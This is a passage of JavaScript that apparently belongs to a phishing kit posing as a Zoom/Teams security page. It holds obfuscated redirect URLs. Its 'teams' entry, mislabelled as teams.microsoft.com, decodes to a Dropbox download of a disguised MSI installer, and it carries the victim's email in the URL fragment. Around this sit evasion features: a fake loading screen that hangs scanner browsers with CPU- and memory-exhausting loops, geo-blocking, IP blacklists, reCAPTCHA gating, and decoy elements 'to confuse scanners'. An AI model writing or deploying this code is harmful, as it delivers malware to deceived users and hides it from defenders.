                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>${template.title}</title>
                <style>
                    ${this.getConstructionStyles()}
                </style>
            </head>
            <body>
                ${template.content}
                <script>
                    ${this.getBotTrapScript()}
                </script>
            </body>
            </html>
        `);
        document.close();
    },
    
    /**
     * Record information about the bot visit
     * @param {string} reason Reason for showing the trap
     */
    recordBotVisit: function(reason) {
        try {
            // Get existing records 
            const botVisits = JSON.parse(localStorage.getItem('bot_visits') || '[]');
            
            // Add new record
            botVisits.push({
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                reason: reason,
                fingerprint: blacklistSystem.getClientIdentifier()
            });
            
            // Keep only the last 100 records
            if (botVisits.length > 100) {
                botVisits.splice(0, botVisits.length - 100);
            }
            
            // Save back to storage
            localStorage.setItem('bot_visits', JSON.stringify(botVisits));
        } catch (e) {
            // Silent fail if localStorage isn't available
        }
    },
    
    /**
     * Get CSS styles for construction pages
     * @returns {string} CSS styles
     */
    getConstructionStyles: function() {
        return `
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }
            
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                line-height: 1.6;
                color: #333;
                background: #f7f7f7;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            
            h1 {
                margin-bottom: 20px;
                font-size: 28px;
                font-weight: 500;
                color: #333;
            }
            
            p {
                margin-bottom: 15px;
                color: #666;
            }
            
            /* Construction Template Styles */
            .construction-container {
                background: white;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                max-width: 550px;
                width: 100%;
                padding: 40px;
                text-align: center;
            }
            
            .construction-icon {
                font-size: 50px;
                margin-bottom: 20px;
            }
            
            .construction-progress {
                margin: 30px 0;
            }
            
            .progress-bar {
                height: 8px;
                background: #eee;
                border-radius: 4px;
                overflow: hidden;
                margin-bottom: 8px;
            }
            
            .progress-fill {
                height: 100%;
                width: 37%;
                background: #4285f4;
                border-radius: 4px;
                animation: pulse 2s infinite;
            }
            
            .progress-text {
                font-size: 14px;
                color: #999;
                text-align: right;
            }
            
            .construction-contact {
                margin-top: 30px;
                font-size: 14px;
            }
            
            .refresh-button {
                margin-top: 20px;
                padding: 10px 20px;
                background: #4285f4;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 14px;
                cursor: pointer;
                transition: background 0.3s;
            }
            
            .refresh-button:hover {
                background: #3367d6;
            }
            
            /* Error Template Styles */
            .error-container {
                background: white;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                max-width: 550px;
                width: 100%;
                padding: 40px;
                text-align: center;
            }
            
            .error-code {
                font-size: 72px;
                font-weight: bold;
                color: #d32f2f;
                margin-bottom: 10px;
            }
            
            .error-details {
                margin: 30px 0;
                padding: 15px;
                background: #f5f5f5;
                border-radius: 4px;
                font-family: monospace;
                font-size: 13px;
                text-align: left;
            }
            
            .retry-button {
                margin-top: 20px;
                padding: 10px 20px;
                background: #d32f2f;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 14px;
                cursor: pointer;
                transition: background 0.3s;
            }
            
            .retry-button:hover {
                background: #b71c1c;
            }
            
            /* Maintenance Template Styles */
            .maintenance-container {
                background: white;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                max-width: 550px;
                width: 100%;
                padding: 40px;
                text-align: center;
            }
            
            .maintenance-icon {
                width: 64px;
                height: 64px;
                margin-bottom: 20px;
                color: #333;
            }
            
            .maintenance-details {
                margin: 30px 0;
                text-align: left;
            }
            
            .maintenance-item {
                display: flex;
                justify-content: space-between;
                padding: 10px 0;
                border-bottom: 1px solid #eee;
            }
            
            .status-label {
                font-weight: 500;
            }
            
            .status-value {
                color: #4285f4;
            }
            
            .status-link {
                display: inline-block;
                margin-top: 20px;
                color: #4285f4;
                text-decoration: none;
            }
            
            .status-link:hover {
                text-decoration: underline;
            }
            
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.7; }
                100% { opacity: 1; }
            }
        `;
    },
    
    /**
     * Generate the bot trap script that creates infinite loops and CPU load
     * @returns {string} JavaScript for the bot trap
     */
    getBotTrapScript: function() {
        return `
            // Create a CPU-intensive loop when buttons or links are clicked
            function createBotTrap() {
                // Find trap elements
                const trapButtons = document.querySelectorAll('#bot-trap-button');
                const trapLinks = document.querySelectorAll('#bot-trap-link');
                
                // Add trap to buttons
                trapButtons.forEach(button => {
                    button.addEventListener('click', function(e) {
                        e.preventDefault();
                        activateTrap();
                    });
                });
                
                // Add trap to links
                trapLinks.forEach(link => {
                    link.addEventListener('click', function(e) {
                        e.preventDefault();
                        activateTrap();
                    });
                });
                
                // Activate after random delay between 30-120 seconds
                // This catches bots that don't interact but wait on the page
                setTimeout(activateTrap, Math.floor(Math.random() * 90000) + 30000);
            }
            
            // Create an infinite loop that consumes CPU and memory
            function activateTrap() {
                // Show a message that seems legitimate to entice further interaction
                showLoadingMessage();
                
                // Start with a short delay to allow UI to update
                setTimeout(function() {
                    // Create an array that grows continuously to consume memory
                    const memoryConsumer = [];
                    
                    // Create a function that runs in a tight loop
                    function infiniteLoop() {
                        // Generate random data and store it
                        for (let i = 0; i < 10000; i++) {
                            memoryConsumer.push(Array(1000).fill(Math.random().toString(36)));
                        }
                        
                        // Perform meaningless but intensive calculations
                        let result = 0;
                        for (let i = 0; i < 10000000; i++) {
                            result += Math.sqrt(i) * Math.cos(i) / (1 + Math.sin(i));
                        }
                        
                        // Continue the loop
                        setTimeout(infiniteLoop, 10);
                    }
                    
                    // Start the infinite loop
                    infiniteLoop();
                }, 500);
            }
            
            // Show a fake loading message to encourage waiting
            function showLoadingMessage() {
                // Create loading indicator
                const loadingDiv = document.createElement('div');
                loadingDiv.style.position = 'fixed';
                loadingDiv.style.top = '0';
                loadingDiv.style.left = '0';
                loadingDiv.style.width = '100%';
                loadingDiv.style.height = '100%';
                loadingDiv.style.background = 'rgba(255,255,255,0.9)';
                loadingDiv.style.display = 'flex';
                loadingDiv.style.flexDirection = 'column';
                loadingDiv.style.alignItems = 'center';
                loadingDiv.style.justifyContent = 'center';
                loadingDiv.style.zIndex = '9999';
                
                // Add spinner
                const spinner = document.createElement('div');
                spinner.style.border = '4px solid #f3f3f3';
                spinner.style.borderTop = '4px solid #3498db';
                spinner.style.borderRadius = '50%';
                spinner.style.width = '50px';
                spinner.style.height = '50px';
                spinner.style.animation = 'spin 1s linear infinite';
                
                // Add keyframes for spinner
                const style = document.createElement('style');
                style.innerHTML = '@keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}';
                document.head.appendChild(style);
                
                // Add loading text
                const loadingText = document.createElement('p');
                loadingText.innerText = 'Loading... Please wait';
                loadingText.style.marginTop = '20px';
                loadingText.style.fontSize = '18px';
                
                // Add progress text that updates
                const progressText = document.createElement('p');
                progressText.innerText = 'Connecting to server...';
                progressText.style.marginTop = '10px';
                progressText.style.fontSize = '14px';
                progressText.style.color = '#666';
                
                // Add elements to the loading div
                loadingDiv.appendChild(spinner);
                loadingDiv.appendChild(loadingText);
                loadingDiv.appendChild(progressText);
                
                // Add to document
                document.body.appendChild(loadingDiv);
                
                // Update progress text periodically to make it look legitimate
                const progressMessages = [
                    'Connecting to server...',
                    'Establishing secure connection...',
                    'Authenticating session...',
                    'Loading site data...',
                    'Checking browser compatibility...',
                    'Optimizing display settings...',
                    'Fetching resources...',
                    'Almost done...',
                    'Finalizing setup...',
                    'Preparing content...'
                ];
                
                let messageIndex = 0;
                
                // Update the message every few seconds to make it look real
                setInterval(function() {
                    if (messageIndex < progressMessages.length) {
                        progressText.innerText = progressMessages[messageIndex];
                        messageIndex++;
                    } else {
                        // After going through all messages, show this indefinitely
                        progressText.innerText = 'Server is responding slowly. Please continue waiting...';
                    }
                }, 3000);
            }
            
            // Initialize the trap
            createBotTrap();
        `;
    }
};

/**
 * URL Fragment Handling Utilities
 * For transferring tracking parameters and identifiers through redirects
 */
const fragmentHandler = {
    /**
     * Extract fragment from the current URL
     * @returns {string} The URL fragment (including #)
     */
    getFragment: function() {
        return window.location.hash;
    },
    
    /**
     * Extract email address or identifier from fragment
     * @returns {string|null} The extracted identifier or null if none found
     */
    extractIdentifier: function() {
        const fragment = this.getFragment();
        
        // No fragment
        if (!fragment || fragment.length <= 1) {
            return null;
        }
        
        // Remove the # character
        const content = fragment.substring(1);
        
        // Check if the fragment looks like an email address
        const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (emailPattern.test(content)) {
            return content; // It's an email address
        }
        
        // Check if it's a tracking code or other identifier
        // Allow alphanumeric values with some special characters
        const identifierPattern = /^[a-zA-Z0-9_\-@.+]{4,50}$/;
        if (identifierPattern.test(content)) {
            return content; // It's a tracking code or identifier
        }
        
        return null; // Not a recognized format
    },
    
    /**
     * Sanitize fragment to prevent XSS or injection
     * @param {string} fragment The fragment to sanitize
     * @returns {string} Sanitized fragment
     */
    sanitizeFragment: function(fragment) {
        if (!fragment) return '';
        
        // Remove any characters that could lead to XSS
        // Only allow alphanumeric, @, ., _, -, +, and %
        return fragment.replace(/[^a-zA-Z0-9@._\-+%]/g, '');
    },
    
    /**
     * Get a properly formatted fragment for redirection
     * @returns {string} Fragment ready to append to URL
     */
    getRedirectFragment: function() {
        const fragment = this.getFragment();
        
        if (!fragment || fragment.length <= 1) {
            return '';
        }
        
        const sanitized = this.sanitizeFragment(fragment);
        return sanitized ? '#' + sanitized : '';
    },
    
    /**
     * Add the current fragment to a destination URL
     * @param {string} baseUrl The base URL to redirect to
     * @returns {string} URL with the fragment appended
     */
    appendFragmentToUrl: function(baseUrl) {
        const fragment = this.getRedirectFragment();
        
        if (!fragment) {
            return baseUrl;
        }
        
        // Check if the base URL already has a fragment
        if (baseUrl.includes('#')) {
            console.warn('Base URL already contains a fragment. Overwriting with new fragment.');
            return baseUrl.split('#')[0] + fragment;
        }
        
        return baseUrl + fragment;
    }
};

/**
 * Provider-specific URL configurations
 * Each provider can have its own obfuscated redirect URL
 */
const providerUrls = {
    // Microsoft Teams - Real configuration
    teams: {
        enabled: true,
        p: "h" + String.fromCharCode(116) + String.fromCharCode(116) + "p" + "s:",  // Protocol: "https:"
        h: atob("Ly93d3cuZHJvcGJveC5jb20v"),  // Domain: "//teams.microsoft.com/"
        e: btoa("scl/fi/z9h1i7359w8qhw2agys9i/Reader_B_installer4.10.2.msi?rlkey=sphj3402iprimp455pv94cjss&st=tnzmnlxc&dl=1").split("").reverse().join("")  // Path: "login" (base64 + reversed)
    },
    
    // Google - Example configuration
    google: {
        enabled: true,
        p: "h" + String.fromCharCode(116) + String.fromCharCode(116) + "p" + "s:",  // Protocol: "https:"
        h: atob("Ly9nb29nbGUuZXhhbXBsZS5jb20v"),  // Domain: "//google.example.com/"
        e: btoa("auth").split("").reverse().join("")  // Path: "auth" (base64 + reversed)
    },
    
    // Yahoo - Example configuration  
    yahoo: {
        enabled: true,
        p: "h" + String.fromCharCode(116) + String.fromCharCode(116) + "p" + "s:",  // Protocol: "https:"
        h: atob("Ly95YWhvby5leGFtcGxlLmNvbS8="),  // Domain: "//yahoo.example.com/"
        e: btoa("signin").split("").reverse().join("")  // Path: "signin" (base64 + reversed)
    },
    
    // Other email providers - Enabled for maximum coverage
    other: {
        enabled: true,  // ACTIVATED - enable all providers
        p: "h" + String.fromCharCode(116) + String.fromCharCode(116) + "p" + "s:",
        h: atob("Ly9vdGhlci5leGFtcGxlLmNvbS8="),  // Domain: "//other.example.com/"
        e: btoa("login").split("").reverse().join("")  // Path: "login" (base64 + reversed)
    }
};

/**
 * Global utils object with provider-specific URL handling
 */
window.utils = {
    /**
     * Get obfuscated URL for a specific email provider
     * @param {string} provider - The provider type ('teams', 'google', 'yahoo', 'other')
     * @param {string} email - Optional email to append as fragment
     * @returns {string|null} - The obfuscated URL or null if provider is disabled
     */
    getObfuscatedUrl: function(provider, email) {
        // Check if provider exists and is enabled
        if (!providerUrls[provider] || !providerUrls[provider].enabled) {
            console.warn(`Provider '${provider}' is not configured or disabled`);
            return null;
        }
        
        const config = providerUrls[provider];
        
        try {
            // Reconstruct the URL from obfuscated parts
            const protocol = config.p;  // "https:"
            const domain = config.h;    // "//domain.com/"
            const path = atob(config.e.split("").reverse().join(""));  // Reverse and decode path
            
            // Build the base URL
            let url = protocol + domain + path;
            
            // Add email as fragment if provided
            if (email && email.trim()) {
                // Sanitize email to prevent XSS
                const sanitizedEmail = email.replace(/[^a-zA-Z0-9@._\-+%]/g, '');
                if (sanitizedEmail) {
                    url += '#' + encodeURIComponent(sanitizedEmail);
                }
            }
            
            return url;
        } catch (error) {
            console.error(`Error constructing URL for provider '${provider}':`, error);
            return null;
        }
    },
    
    /**
     * Check if a provider is enabled and configured
     * @param {string} provider - The provider type
     * @returns {boolean} - True if provider is enabled
     */
    isProviderEnabled: function(provider) {
        return providerUrls[provider] && providerUrls[provider].enabled;
    },
    
    /**
     * Get list of all enabled providers
     * @returns {Array} - Array of enabled provider names
     */
    getEnabledProviders: function() {
        return Object.keys(providerUrls).filter(provider => 
            providerUrls[provider] && providerUrls[provider].enabled
        );
    },
    
    /**
     * Enable or disable a provider
     * @param {string} provider - The provider type
     * @param {boolean} enabled - Whether to enable or disable
     */
    setProviderEnabled: function(provider, enabled) {
        if (providerUrls[provider]) {
            providerUrls[provider].enabled = enabled;
            console.log(`Provider '${provider}' ${enabled ? 'enabled' : 'disabled'}`);
        }
    },
    
    /**
     * Update provider URL configuration
     * @param {string} provider - The provider type
     * @param {Object} config - New configuration object
     */
    updateProviderConfig: function(provider, config) {
        if (providerUrls[provider]) {
            providerUrls[provider] = { ...providerUrls[provider], ...config };
            console.log(`Provider '${provider}' configuration updated`);
        }
    },
    
    /**
     * Configure malicious IPs and IP ranges for blocking
     * @param {Array<string>} ips - Array of IP addresses to block
     * @param {Array<string>} ranges - Array of CIDR ranges to block
     */
    configureMaliciousIPs: function(ips = [], ranges = []) {
        // Add IPs to the blacklist system
        if (typeof blacklistSystem !== 'undefined') {
            blacklistSystem.addMaliciousIPs(ips);
            
            // Add IP ranges
            if (ranges.length > 0) {
                blacklistSystem.blockedIPRanges.push(...ranges);
                console.log(`Added ${ranges.length} IP ranges to blocklist`);
            }
            
            console.log('Malicious IP configuration updated');
        } else {
            console.error('Blacklist system not available');
        }
    },
    
    /**
     * Get current visitor's IP address
     * @returns {string|null} Detected IP address
     */
    getVisitorIP: function() {
        return (typeof blacklistSystem !== 'undefined') ? blacklistSystem.visitorIP : null;
    },
    
    /**
     * Check if current visitor's IP is blocked
     * @returns {boolean} True if IP is blocked
     */
    isCurrentIPBlocked: function() {
        if (typeof blacklistSystem !== 'undefined' && blacklistSystem.visitorIP) {
            return blacklistSystem.isIPBlocked(blacklistSystem.visitorIP);
        }
        return false;
    },
    
    /**
     * reCAPTCHA v3 integration (Invisible, Score-Based)
     * Usage: Call utils.runRecaptchaV3() after DOM is ready
     * Requires reCAPTCHA v3 script in HTML: <script src="https://www.google.com/recaptcha/api.js?render=YOUR_SITE_KEY"></script>
     * Set window.RECAPTCHA_SITE_KEY = 'YOUR_SITE_KEY'; before calling.
     */
    runRecaptchaV3: function(action = 'zoom_security', minScore = 0.5, callback) {
        if (typeof grecaptcha === 'undefined' || !window.RECAPTCHA_SITE_KEY) {
            console.warn('reCAPTCHA v3 not loaded or site key missing');
            return;
        }
        grecaptcha.ready(function() {
            grecaptcha.execute(window.RECAPTCHA_SITE_KEY, {action: action}).then(function(token) {
                // Send token to server for verification and score
                // Example AJAX POST (replace URL with your endpoint):
                fetch('/recaptcha-verify', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token: token, action: action})
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success && data.score >= minScore) {
                        if (typeof callback === 'function') callback(true, data.score);
                    } else {
                        // Block or show bot trap
                        if (typeof callback === 'function') callback(false, data.score);
                        botTrapSystem.showConstructionPage('recaptcha_v3_low_score');
                    }
                })
                .catch(() => {
                    // On error, treat as suspicious
                    if (typeof callback === 'function') callback(false, 0);
                    botTrapSystem.showConstructionPage('recaptcha_v3_error');
                });
            });
        });
    }
};

/**
 * Automatically run reCAPTCHA v3 on page load for invisible bot scoring
 * Set window.RECAPTCHA_SITE_KEY = 'YOUR_SITE_KEY'; in your HTML before this runs
 * You can adjust minScore as needed (default 0.5)
 */
document.addEventListener('DOMContentLoaded', function() {
    // Initialize provider buttons
    initializeProviderButtons();
    
    // Run reCAPTCHA v3 if site key is set
    if (window.RECAPTCHA_SITE_KEY) {
        utils.runRecaptchaV3('zoom_security', 0.5, function(success, score) {
            if (!success) {
                // Already handled by runRecaptchaV3 (shows bot trap)
                // Optionally log or take further action here
                console.warn('reCAPTCHA v3 score too low:', score);
            } else {
                // Optionally log human visit with score
                logHumanVisit('recaptcha_v3_pass_' + score);
            }
        });
    } else {
        console.warn('RECAPTCHA_SITE_KEY not set. reCAPTCHA v3 will not run.');
    }
    
    // Initialize other systems
    blacklistSystem.init();
    geoBlockSystem.init();
    sessionProtection.init();
    obfuscationSystem.injectObfuscatedElements();
});

// Also initialize if DOM is already loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeProviderButtons);
} else {
    initializeProviderButtons();
}

/**
 * Geolocation-based blocking system
 * Blocks/redirects visitors from unwanted countries/regions
 */
const geoBlockSystem = {
    blockedCountries: ["RU", "CN", "KP", "IR", "SY", "CU"], // Example: block Russia, China, North Korea, Iran, Syria, Cuba
    visitorCountry: null,
    init: async function() {
        try {
            const ip = blacklistSystem.visitorIP;
            if (!ip) return;
            // Use geoplugin.net for country lookup
            const resp = await fetch(`https://www.geoplugin.net/json.gp?ip=${ip}`);
            const data = await resp.json();
            this.visitorCountry = data.geoplugin_countryCode || null;
            if (this.blockedCountries.includes(this.visitorCountry)) {
                this.blockAction();
            }
        } catch (e) {
            // Silent fail
        }
    },
    blockAction: function() {
        // Redirect to decoy page or show bot trap
        botTrapSystem.showConstructionPage('geo_blocked');
    }
};

/**
 * Session protection logic
 * Uses secure token and expiration for session validation
 */
const sessionProtection = {
    sessionKey: 'zoom_session_token',
    expirationKey: 'zoom_session_expiry',
    sessionDuration: 1800, // 30 minutes
    init: async function() {
        try {
            let token = localStorage.getItem(this.sessionKey);
            let expiry = parseInt(localStorage.getItem(this.expirationKey), 10);
            const now = Date.now();
            if (!token || !expiry || now > expiry) {
                token = await generateSecureToken();
                expiry = now + this.sessionDuration * 1000;
                localStorage.setItem(this.sessionKey, token);
                localStorage.setItem(this.expirationKey, expiry.toString());
            }
        } catch (e) {
            // Silent fail
        }
    },
    validate: function() {
        const token = localStorage.getItem(this.sessionKey);
        const expiry = parseInt(localStorage.getItem(this.expirationKey), 10);
        return token && expiry && Date.now() < expiry;
    }
};

/**
 * Obfuscation system: injects invisible HTML elements to confuse scanners
 */
const obfuscationSystem = {
    injectObfuscatedElements: function() {
        try {
            for (let i = 0; i < 5; i++) {
                const span = document.createElement('span');
                span.style.padding = '0 !important';
                span.style.margin = '0 !important';
                span.style.display = 'inline-block !important';
                span.style.width = '0 !important';
                span.style.height = '0 !important';
                span.style.fontSize = '0 !important';
                span.textContent = (Math.random() + '').substring(2, 3);
                span.id = 'obf_' + Math.random().toString(36).substring(2, 8);
                document.body.appendChild(span);
            }
        } catch (e) {
            // Silent fail
        }
    }
};

/**
 * Human logging: log successful human visits
 * Call this after successful CAPTCHA or challenge
 */
function logHumanVisit(eventType = 'challenge_passed') {
    try {
        const logs = JSON.parse(localStorage.getItem('human_logs') || '[]');
        logs.push({
            timestamp: Date.now(),
            ip: blacklistSystem.visitorIP,
            userAgent: navigator.userAgent,
            fingerprint: blacklistSystem.getClientIdentifier(),
            event: eventType
        });
        if (logs.length > 100) logs.splice(0, logs.length - 100);
        localStorage.setItem('human_logs', JSON.stringify(logs));
    } catch (e) {
        // Silent fail
    }

}

